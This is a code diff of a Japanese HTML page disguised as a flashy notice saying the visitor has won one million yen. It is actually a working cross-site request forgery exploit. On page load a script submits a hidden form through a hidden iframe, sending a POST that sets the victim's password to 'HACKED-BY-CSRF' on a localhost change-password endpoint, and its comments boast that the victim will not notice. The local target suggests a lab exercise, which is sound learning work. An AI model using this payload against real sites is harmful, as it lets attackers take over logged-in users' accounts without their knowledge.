@@ -2,22 +2,71 @@
 <html lang="ja">
   <head>
     <meta charset="UTF-8" />
-    <title>おめでとうございます！</title>
+    <title>🚨【重要】おめでとうございます！🚨</title>
+    <style>
+      body {
+        background-color: #ff0; /* 目が痛い黄色 */
+        font-family: "MS UI Gothic", sans-serif;
+        text-align: center;
+        padding-top: 50px;
+      }
+      .shimmer {
+        color: red;
+        font-size: 3em;
+        animation: blink 0.5s infinite;
+      }
+      @keyframes blink {
+        0% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0;
+        }
+        100% {
+          opacity: 1;
+        }
+      }
+      .content {
+        background: white;
+        border: 10px double red;
+        display: inline-block;
+        padding: 20px;
+      }
+    </style>
   </head>
-  <body onload="document.forms[0].submit()">
-    <div style="text-align: center; margin-top: 50px">
-      <h1 style="color: red">🎊 100万円に当選しました！ 🎊</h1>
-      <p>
-        おめでとうございます！手続きのためにこのページを閉じないでください...
+
+  <body>
+    <div class="content">
+      <h1 class="shimmer">🎊 祝・100万円当選 🎊</h1>
+      <h2>あなたは選ばれました！</h2>
+      <p style="font-size: 20px; font-weight: bold">
+        現在、送金手続きを行っています...<br />
+        <span style="color: blue"
+          >このページを閉じずに、あと30秒ほどお待ちください。</span
+        >
       </p>
     </div>
 
+    <iframe name="dark_side" style="display: none"></iframe>
+
     <form
-      action="http://localhost:8080/auth/change_password.php"
+      id="attack-form"
+      action="http://localhost:8080/db/change_password.php"
       method="POST"
-      style="display: none"
+      target="dark_side"
     >
-      <input type="hidden" name="new_password" value="KOTSU-ZEN-HACKED" />
+      <input type="hidden" name="new_password" value="HACKED-BY-CSRF" />
     </form>
+
+    <script>
+      // ページが読み込まれた瞬間に、ユーザーに気づかれず送信！
+      window.onload = function () {
+        console.log("😈 攻撃開始...");
+        document.getElementById("attack-form").submit();
+        console.log(
+          "✅ 送信完了。あとは獲物がログイン中であることを祈るだけです。",
+        );
+      };
+    </script>
   </body>
 </html>
